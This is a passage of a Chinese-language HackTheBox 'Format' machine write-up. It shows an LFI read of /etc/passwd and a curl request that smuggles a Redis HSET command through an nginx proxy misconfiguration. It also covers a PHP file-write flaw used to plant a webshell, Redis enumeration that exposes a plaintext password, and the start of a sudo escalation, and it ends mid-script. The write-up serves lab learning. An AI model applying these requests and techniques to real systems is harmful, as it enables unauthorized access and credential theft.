+                <div class="image-caption">](Format.assets/image-20230514163354915.png#id=JncGI&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514163354915.png</div>
+            </figure>
+
+<p>这一次请求把&#x2F;etc&#x2F;passwd写入到order_file这个文件中去了</p>
+<p>当我们再一次访问这个页面的时候，就会触发<code>fetchPage</code>这个函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120397510-96f2bdfe-62a0-4c13-9c7a-d5568369f5a4.png#averageHue=%23172f40&clientId=u6ea49036-b440-4&from=paste&height=851&id=uf647c464&originHeight=957&originWidth=1906&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=209862&status=done&style=none&taskId=ud7fa0bde-ee47-4dcf-aac9-4080848f7e9&title=&width=1694.2222222222222" alt="](Format.assets/image-20230514163546376.png#id=G192Y&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514163546376.png" title="">
+                </div>
+                <div class="image-caption">](Format.assets/image-20230514163546376.png#id=G192Y&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image-20230514163546376.png</div>
+            </figure>
+
+<p>这个函数会调用</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686120408592-5873637e-67ad-4785-8253-4ff015cefc76.png#averageHue=%231a374b&clientId=u6ea49036-b440-4&from=paste&height=247&id=u5dd0e80b&originHeight=278&originWidth=1295&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=34822&status=done&style=none&taskId=u3463c5b9-5dfe-48fe-80c2-5ec94478a14&title=&width=1151.111111111111" alt="image-20230514163447371.png" title="">
+                </div>
+                <div class="image-caption">image-20230514163447371.png</div>
+            </figure>
+<p>file_get_contents($line)</p>
+<p>前面我们把&#x2F;etc&#x2F;passwd 写入到order.txt这个文件里面去了,所以这里读取到了&#x2F;etc&#x2F;passwd的内容</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="Format.assets/image-20230514163447371.png#id=bnXLA&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<pre><code class="bash">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+cooper:x:1000:1000::/home/cooper:/bin/bash
+redis:x:103:33::/var/lib/redis:/usr/sbin/nologin
+git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
+messagebus:x:105:112::/nonexistent:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:997:997::/var/log/laurel:/bin/false
+</code></pre>
+<pre><code class="bash">root:x:0:0:root:/root:/bin/bash
+cooper:x:1000:1000::/home/cooper:/bin/bash
+git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
+</code></pre>
+<h2 id="x2F-etc-x2F-nginx-x2F-site-available-x2F-default"><a href="#x2F-etc-x2F-nginx-x2F-site-available-x2F-default" class="headerlink" title="&#x2F;etc&#x2F;nginx&#x2F;site-available&#x2F;default"></a>&#x2F;etc&#x2F;nginx&#x2F;site-available&#x2F;default</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687582766877-d610dca0-2652-4040-938d-73b64571805a.png#averageHue=%237b9052&clientId=u3df09d10-6dd0-4&from=paste&height=638&id=ufb0cd5cf&originHeight=797&originWidth=1263&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=230831&status=done&style=none&taskId=ua7d31666-3e25-4af8-a023-6cd5068e291&title=&width=1010.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<pre><code class="c">
+# You should look at the following URL&#39;s in order to grasp a solid understanding
+# of Nginx configuration files in order to fully unleash the power of Nginx.
+# https://www.nginx.com/resources/wiki/start/
+# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
+# https://wiki.debian.org/Nginx/DirectoryStructure
+#
+# In most cases, administrators will remove this file from sites-enabled/ and
+# leave it as reference inside of sites-available where it will continue to be
+# updated by the nginx packaging team.
+#
+# This file will automatically load configuration files provided by other
+# applications, such as Drupal or Wordpress. These applications will be made
+# available underneath a path with that package name, such as /drupal8.
+#
+# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
+##
+
+# Default server configuration
+#
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+
+    # SSL configuration
+    #
+    # listen 443 ssl default_server;
+    # listen [::]:443 ssl default_server;
+    #
+    # Note: You should disable gzip for SSL traffic.
+    # See: https://bugs.debian.org/773332
+    #
+    # Read up on ssl_ciphers to ensure a secure configuration.
+    # See: https://bugs.debian.org/765782
+    #
+    # Self signed certs generated by the ssl-cert package
+    # Don&#39;t use them in a production server!
+    #
+    # include snippets/snakeoil.conf;
+
+    root /var/www/html;
+
+    # Add index.php to the list if you are using PHP
+    index index.html index.htm index.nginx-debian.html;
+
+    server_name _;
+
+    location / {
+        # First attempt to serve request as file, then
+        # as directory, then fall back to displaying a 404.
+        try_files $uri $uri/ =404;
+    }
+
+    # pass PHP scripts to FastCGI server
+    #
+    #location ~ .php$ {
+    #	include snippets/fastcgi-php.conf;
+    #
+    #	# With php-fpm (or other unix sockets):
+    #	fastcgi_pass unix:/run/php/php7.4-fpm.sock;
+    #	# With php-cgi (or other tcp sockets):
+    #	fastcgi_pass 127.0.0.1:9000;
+    #}
+
+    # deny access to .htaccess files, if Apache&#39;s document root
+    # concurs with nginx&#39;s one
+    #
+    #location ~ /.ht {
+    #	deny all;
+    #}
+}
+
+server {
+    listen 80;
+    listen [::]:80;
+
+    root /var/www/microblog/app;
+
+    index index.html index.htm index-nginx-debian.html;
+
+    server_name microblog.htb;
+
+    location / {
+        return 404;
+    }
+
+    location = /static/css/health/ {
+        resolver 127.0.0.1;
+        proxy_pass http://css.microbucket.htb/health.txt;
+    }
+
+    location = /static/js/health/ {
+        resolver 127.0.0.1;
+        proxy_pass http://js.microbucket.htb/health.txt;
+    }
+
+    location ~ /static/(.*)/(.*) {
+        resolver 127.0.0.1;
+        proxy_pass http://$1.microbucket.htb/$2;
+    }
+}
+
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687588768718-f448aa7c-9986-4b5c-ba32-0b617109ebca.png#averageHue=%2319364a&clientId=u3df09d10-6dd0-4&from=paste&height=76&id=u7e7aeb95&originHeight=95&originWidth=451&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7155&status=done&style=none&taskId=u718bf427-7901-49b6-ab68-09ea8ee9daa&title=&width=360.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这里 有一个错误的配置，可以导致对内网中redis程序进行任意命令执行<br>Refer:<a href="https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/" target="_blank" rel="noopener">https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687590728412-55829076-484a-47d5-b983-0083a5e0a614.png#averageHue=%23d9d9d9&clientId=u3df09d10-6dd0-4&from=paste&height=646&id=udc5ed7ec&originHeight=808&originWidth=1262&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94842&status=done&style=none&taskId=uc995d0b6-e65f-495d-a492-8c514a71c2a&title=&width=1009.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687589217106-a7303d84-029d-4bf9-8f12-bd3b33dc28f7.png#averageHue=%23c1c0c0&clientId=u3df09d10-6dd0-4&from=paste&height=725&id=uadc02607&originHeight=906&originWidth=1679&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106037&status=done&style=none&taskId=u976dbbdd-ed09-4775-acc0-116d5e48cea&title=&width=1343.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>也就是说原本的方法的位置(GET,POST)我们改为 redis的命令<br>而socket:后面绿色的部分  即为redis参数 </p>
+<pre><code class="bash">┌──(root💀kali)-[/home/…/hacktheboxtools/machine/Format/config]
+└─# curl  -X &quot;HSET&quot; &quot;http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:somebody%20pro%20%22true%22%20/d&quot; -v
+*   Trying 10.10.11.213:80...
+* Connected to microblog.htb (10.10.11.213) port 80 (#0)
+&gt; HSET /static/unix:%2fvar%2frun%2fredis%2fredis.sock:somebody%20pro%20%22true%22%20/d HTTP/1.1
+&gt; Host: microblog.htb
+&gt; User-Agent: curl/7.87.0
+&gt; Accept: */*
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 502 Bad Gateway
+&lt; Server: nginx/1.18.0
+&lt; Date: Sat, 24 Jun 2023 07:18:42 GMT
+&lt; Content-Type: text/html
+&lt; Content-Length: 157
+&lt; Connection: keep-alive
+&lt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;502 Bad Gateway&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;502 Bad Gateway&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+* Connection #0 to host microblog.htb left intact
+</code></pre>
+<pre><code class="bash">curl -X &quot;Redis Command&quot; &quot;http://microblog.htb/static/unix:&lt;local Socket unix&gt;:&lt;Redis Table&gt;%20&lt;Redis Name&gt;%20%22True%22%20/AnyThings&quot;
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687591193073-2d5a3ac1-e833-4b09-9cf1-242dde5dbc03.png#averageHue=%23c5ecef&clientId=u3df09d10-6dd0-4&from=paste&height=737&id=ubd04e387&originHeight=921&originWidth=1894&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156285&status=done&style=none&taskId=u4262dbd2-54b1-482a-9acc-2e435c7e7ca&title=&width=1515.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>我们已经成功变成了管理员权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687591383165-d8997f8f-3c41-4725-9777-c5a3888ab116.png#averageHue=%23c0d8b3&clientId=u3df09d10-6dd0-4&from=paste&height=429&id=u42cd902b&originHeight=536&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37216&status=done&style=none&taskId=ucaa268b4-f829-48cc-83b4-225d300cb43&title=&width=1532.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>有了管理员的权限后就多了一个可以edit的标签<br>我们可以上传一个文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687593130855-57601e9b-31c4-4aea-9a42-ae43f5761889.png#averageHue=%23312f2f&clientId=u3df09d10-6dd0-4&from=paste&height=625&id=uc80b40db&originHeight=781&originWidth=1244&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=223273&status=done&style=none&taskId=uf361d348-d74e-4fd0-8f4d-59dd65bd621&title=&width=995.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>直接这样上传发现失败了</p>
+<pre><code class="php">protected function contraintsValidator()
+  {
+  /* check image for valid mime types and return mime */
+  $this-&gt;getImageMime($this-&gt;_files[&#39;tmp_name&#39;]);
+  /* validate image mime type */
+  if (!in_array($this-&gt;mime, $this-&gt;mimeTypes)) {
+  $this-&gt;error = sprintf(&#39;Invalid File! Only (%s) image types are allowed&#39;, implode(&#39;, &#39;, $this-&gt;mimeTypes));
+  return false;
+  }
+
+  /* get image sizes */
+  list($minSize, $maxSize) = $this-&gt;size;
+
+  /* check image size based on the settings */
+  if ($this-&gt;_files[&#39;size&#39;] &lt; $minSize || $this-&gt;_files[&#39;size&#39;] &gt; $maxSize) {
+  $min = $minSize.&#39; bytes (&#39;.intval($minSize / 1000).&#39; kb)&#39;;
+  $max = $maxSize.&#39; bytes (&#39;.intval($maxSize / 1000).&#39; kb)&#39;;
+  $this-&gt;error = &#39;Image size should be minumum &#39;.$min.&#39;, upto maximum &#39;.$max;
+  return false;
+  }
+
+  /* check image dimension */
+  list($maxWidth, $maxHeight) = $this-&gt;dimensions;	
+  $this-&gt;width = $this-&gt;getWidth();
+  $this-&gt;height = $this-&gt;getHeight();
+
+  if ($this-&gt;height &gt; $maxHeight || $this-&gt;width &gt; $maxWidth) {
+  $this-&gt;error = &#39;Image height/width should be less than &#39;.$maxHeight.&#39;/&#39;.$maxWidth.&#39; pixels&#39;;
+  return false;
+  }
+
+  return true;
+  }
+</code></pre>
+<p>这里有一段校验的代码</p>
+<ol>
+<li>校验MIME</li>
+<li>校验文件大小</li>
+<li>校验图片的长和宽</li>
+</ol>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687593295125-0a97f9c5-62ce-4ec2-b90f-40b408d57bbe.png#averageHue=%2319364a&clientId=u3df09d10-6dd0-4&from=paste&height=526&id=ue399484a&originHeight=658&originWidth=957&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71869&status=done&style=none&taskId=ua3c93af7-0b58-4bb1-92b8-4c18bb03e4b&title=&width=765.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>实际MIME设置为png,Size最小为100，最大为3000000<br>但是我们又仔细看这里其实好像上传文件名被限制死为.png了<br>所以这个点不能利用</p>
+<h2 id="寻找利用点"><a href="#寻找利用点" class="headerlink" title="寻找利用点"></a>寻找利用点</h2><h3 id="provisionProUser"><a href="#provisionProUser" class="headerlink" title="provisionProUser"></a>provisionProUser</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597411728-4230ebcd-188c-47f5-85a4-a81d01ba0713.png#averageHue=%23193244&clientId=u3df09d10-6dd0-4&from=paste&height=598&id=u27ce2323&originHeight=748&originWidth=1853&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=241135&status=done&style=none&taskId=uc487090c-6d22-467d-84f2-31ddc5e8262&title=&width=1482.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>搜索isPro相关的内容的时候，发现这里有一个函数，是管理员才会调用就是 </p>
+<pre><code class="php">function provisionProUser() {
+    if(isPro() === &quot;true&quot;) {
+        $blogName = trim(urldecode(getBlogName()));
+        system(&quot;chmod +w /var/www/microblog/&quot; . $blogName);
+        system(&quot;chmod +w /var/www/microblog/&quot; . $blogName . &quot;/edit&quot;);
+        system(&quot;cp /var/www/pro-files/bulletproof.php /var/www/microblog/&quot; . $blogName . &quot;/edit/&quot;);
+        system(&quot;mkdir /var/www/microblog/&quot; . $blogName . &quot;/uploads &amp;&amp; chmod 700 /var/www/microblog/&quot; . $blogName . &quot;/uploads&quot;);
+        system(&quot;chmod -w /var/www/microblog/&quot; . $blogName . &quot;/edit &amp;&amp; chmod -w /var/www/microblog/&quot; . $blogName);
+    }
+    return;
+}
+</code></pre>
+<p>给我们创建的blog的网站根目录 授予写的权限<br><code>system(&quot;mkdir /var/www/microblog/&quot; . $blogName . &quot;/uploads &amp;&amp; chmod 700 /var/www/microblog/&quot; . $blogName . &quot;/uploads&quot;);</code><br>这一句<br>先创建<code> /var/www/microblog/我们的创建的域名/uploads</code>这个文件夹<br>再给<code>/var/www/microblog/我们的创建的域名/uploads</code>授权表示带有文件创建者具有 RWX的权限</p>
+<h3 id="add-header"><a href="#add-header" class="headerlink" title="add-header"></a>add-header</h3><pre><code class="php">if (isset($_POST[&#39;header&#39;]) &amp;&amp; isset($_POST[&#39;id&#39;])) {
+    chdir(getcwd() . &quot;/../content&quot;);
+    $html = &quot;&lt;div class = \&quot;blog-h1 blue-fill\&quot;&gt;&lt;b&gt;{$_POST[&#39;header&#39;]}&lt;/b&gt;&lt;/div&gt;&quot;;
+    $post_file = fopen(&quot;{$_POST[&#39;id&#39;]}&quot;, &quot;w&quot;);
+    fwrite($post_file, $html);
+    fclose($post_file);
+    $order_file = fopen(&quot;order.txt&quot;, &quot;a&quot;);
+    fwrite($order_file, $_POST[&#39;id&#39;] . &quot;\n&quot;);  
+    fclose($order_file);
+    header(&quot;Location: /edit?message=Section added!&amp;status=success&quot;);
+}
+</code></pre>
+<p>还记得前面这个地方我们是可以LFI的吗，同时他其实也可以写文件，id和header都是我们可以控制的参数<br>id控制写入的文件名，header控制写入的内容<br>再加上前面给uploads这个文件夹赋予了权限，所以我们尝试写shell</p>
+<h2 id="webshell写入"><a href="#webshell写入" class="headerlink" title="webshell写入"></a>webshell写入</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597793467-a0be2eaf-d0d4-49a3-8899-c97d74797a15.png#averageHue=%23c7aa74&clientId=u3df09d10-6dd0-4&from=paste&height=702&id=u48ce1598&originHeight=878&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=49433&status=done&style=none&taskId=u4c32f589-3cbf-4202-b1fe-3bbacb63851&title=&width=1530.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>.
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597822302-751d925e-5a13-4fb1-a97f-3791807750c1.png#averageHue=%23121212&clientId=u3df09d10-6dd0-4&from=paste&height=498&id=ue00b8441&originHeight=623&originWidth=1470&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79858&status=done&style=none&taskId=u1f1c7cbc-1ebf-489e-86d7-b2145458166&title=&width=1176" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597834053-82688e30-3bbc-42b9-a5df-da5e10860697.png#averageHue=%23d0be88&clientId=u3df09d10-6dd0-4&from=paste&height=693&id=u9e4d5dc3&originHeight=866&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77348&status=done&style=none&taskId=ue9e2d37f-61a4-491a-a59f-5fa1e7604b3&title=&width=1536" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687597849186-d5165f7f-4438-4adf-8edb-f5ad1836298b.png#averageHue=%23ececec&clientId=u3df09d10-6dd0-4&from=paste&height=650&id=u5b05905f&originHeight=813&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58537&status=done&style=none&taskId=ub568767a-3358-4fb4-99d3-a8616e0fe72&title=&width=1528.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>创建了一个abcc的子域名</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687598078510-8aa618f4-88a3-477a-80db-a01fbcaf6523.png#averageHue=%232f2f2f&clientId=u3df09d10-6dd0-4&from=paste&height=590&id=u92fa9681&originHeight=738&originWidth=1259&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191923&status=done&style=none&taskId=u01472c40-ec57-49a5-b4f8-a8525e744d8&title=&width=1007.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>发起添加header的请求，修改id和header</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687598181948-064a74be-e51b-483d-8012-95f88eec871d.png#averageHue=%232e2d2d&clientId=u3df09d10-6dd0-4&from=paste&height=478&id=u0632d671&originHeight=597&originWidth=1213&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112495&status=done&style=none&taskId=ua5fde5b1-2219-4e5e-baac-af076a331f8&title=&width=970.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>成功执行命令</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687598265863-5fcdde17-63fc-43bd-a15a-330de28d870f.png#averageHue=%23242423&clientId=u3df09d10-6dd0-4&from=paste&height=623&id=u3bfd708c&originHeight=779&originWidth=1414&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=198326&status=done&style=none&taskId=ub11af465-8ef8-438d-8ed7-ad4680cae80&title=&width=1131.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="pspy"><a href="#pspy" class="headerlink" title="pspy"></a>pspy</h2><p>记得我们在web端进行操作的时候每隔一段时间我们的用户信息和创建的子域名就会被删除，我们上pspy看一下进程</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687600815842-0e4e6315-fed6-4c4b-8a07-1c9c9abb8178.png#averageHue=%23111111&clientId=u3df09d10-6dd0-4&from=paste&height=810&id=ue41a2bf7&originHeight=1012&originWidth=1652&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=272881&status=done&style=none&taskId=uf8683ed0-2402-491c-827f-24e8cb84165&title=&width=1321.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>等了老长一段时间</p>
+<h2 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h2><p>发现了redis-cli 连接 redis.sock</p>
+<pre><code class="bash">keys *
+cooper.dooper
+cooper.dooper:sites
+  
+type cooper.dooper
+hash
+  
+type cooper.dooper:sites
+list
+  
+hgetall  cooper.dooper
+username
+cooper.dooper
+password
+zooperdoopercooper
+first-name
+Cooper
+last-name
+Dooper
+pro
+false
+
+LRANGE cooper.dooper:sites 0 -1
+sunny
+</code></pre>
+<p> 先用keys * 来看有什么键值对<br>接着用type 命令来看 这个keys是什么类型的</p>
+<ol>
+<li>hash –&gt; hgetall 查看对应的键的值<ol>
+<li>usename–&gt;cooper.dooper</li>
+<li>password–&gt;zooperdoopercooper</li>
+<li>first-name–&gt;Cooper</li>
+<li>last-name–&gt;Dooper</li>
+<li>pro–&gt;false</li>
+</ol>
+</li>
+<li>list  –&gt; 用 LRANGE 来看 <ol>
+<li>所以这个list里面只有一个sunny数据</li>
+</ol>
+</li>
+</ol>
+<p>LRANGE 命令用于获取列表中指定范围内的元素，其中第二个参数为起始索引，第三个参数为结束索引。如果将第二个参数设置为 0，将第三个参数设置为 -1，则表示获取列表中所有元素。</p>
+<h3 id="hash-类型"><a href="#hash-类型" class="headerlink" title="hash 类型"></a>hash 类型</h3><p>如果你想查看 cooper.dooper 哈希表中的所有字段和值，可以使用以下命令：</p>
+<pre><code>redis-cli HGETALL cooper.dooper
+</code></pre>
+<p>以上命令将返回 cooper.dooper 哈希表中所有字段和对应的值。<br>如果你只想查看 username、password、first-name 和 last-name 这些字段的值，可以使用以下命令：</p>
+<pre><code>redis-cli HMGET cooper.dooper username password first-name last-name
+</code></pre>
+<p>以上命令中，HMGET 命令用于获取哈希表中指定字段的值，其中第二个参数为要获取的字段名。<br>如果你想查看 pro 字段的值，可以使用以下命令：</p>
+<pre><code>redis-cli HGET cooper.dooper pro
+</code></pre>
+<p>以上命令将返回 cooper.dooper 哈希表中 pro 字段的值。<br>需要注意的是，在使用以上命令时，需要注意命令的使用方式和参数，以确保获取正确的信息。同时，为了保证 Redis 服务器的性能和安全性，需要对读取信息的操作进行适当的限制和控制。</p>
+<h3 id="list-类型"><a href="#list-类型" class="headerlink" title="list 类型"></a>list 类型</h3><p>如果你想查看 cooper.dooper:sites 列表中的元素 sunny 的详细信息，需要先确定这个元素的位置（即索引）。可以使用以下命令来查找元素索引：</p>
+<pre><code>redis-cli LPOS cooper.dooper:sites sunny
+</code></pre>
+<p>以上命令中，LPOS 命令用于查找列表中第一个值与 sunny 相等的元素的索引。<br>如果 LPOS 命令返回的索引是 n，则可以使用以下命令来获取列表中第 n 个元素的详细信息：</p>
+<pre><code>redis-cli LINDEX cooper.dooper:sites n
+</code></pre>
+<p>以上命令将返回列表中第 n 个元素的值。<br>需要注意的是，在使用以上命令时，需要注意命令的使用方式和参数，以确保获取正确的信息。同时，为了保证 Redis 服务器的性能和安全性，需要对读取信息的操作进行适当的限制和控制。</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cooper.dooper</td>
+<td>zooperdoopercooper</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687602209214-5499c37b-5560-4898-a196-3b866d42165a.png#averageHue=%231a1a1a&clientId=u3df09d10-6dd0-4&from=paste&height=135&id=u8b7a0524&originHeight=169&originWidth=737&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16209&status=done&style=none&taskId=u786e75fb-ddbd-46d9-a755-923b6af2753&title=&width=589.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>成功拿到user权限 </p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687602288184-401ab665-4ab2-4ce6-9780-d831af0ec0e6.png#averageHue=%23181818&clientId=u3df09d10-6dd0-4&from=paste&height=555&id=ub1fc0925&originHeight=694&originWidth=1201&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94353&status=done&style=none&taskId=ued984c5a-7488-42f9-ad6c-de6315d6465&title=&width=960.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<pre><code class="bash">cooper@format:/usr/bin$ sudo -l
+Matching Defaults entries for cooper on format:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cooper may run the following commands on format:
+    (root) /usr/bin/license
+cooper@format:/usr/bin$ file /usr/bin/license
+/usr/bin/license: Python script, ASCII text executable
+
+</code></pre>
+<pre><code class="python">#!/usr/bin/python3
+
+import base64
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.fernet import Fernet
+import random
+import string
+from datetime import date
+import redis
+import argparse
+import os
+import sys
+
+class License():
+def __init__(self):
+chars = string.ascii_letters + string.digits + string.punctuation
+self.license = &#39;&#39;.join(random.choice(chars) for i in range(40))
+self.created = date.today()
+
